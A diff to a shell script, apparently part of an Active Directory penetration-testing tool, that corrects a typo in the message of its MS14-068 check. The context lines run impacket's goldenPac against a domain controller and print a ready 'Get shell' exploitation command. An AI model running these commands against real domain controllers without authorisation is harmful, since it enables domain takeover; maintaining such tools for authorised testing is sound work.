@@ -1204,7 +1204,7 @@ ms14-068_check () {
         else
             ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} None -target-ip ${dc_ip} 2>/dev/null  | tee ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt 2>&1
             if grep -q "found vulnerable" ${output_dir}/Vulnerabilities/ms14-068_output_${dc_domain}.txt; then
-                echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found (False postive possible on newer Windows versions)! Follow steps below for exploitation:${NC}"
+                echo -e "${GREEN}[+] Domain controller vulnerable to ms14-068 found (False positives possible on newer versions of Windows)! Follow steps below for exploitation:${NC}"
                 echo -e "Get shell: ${impacket_goldenPac} ${argument_imp}@${dc_FQDN} -target-ip ${dc_ip}"
             fi
         fi
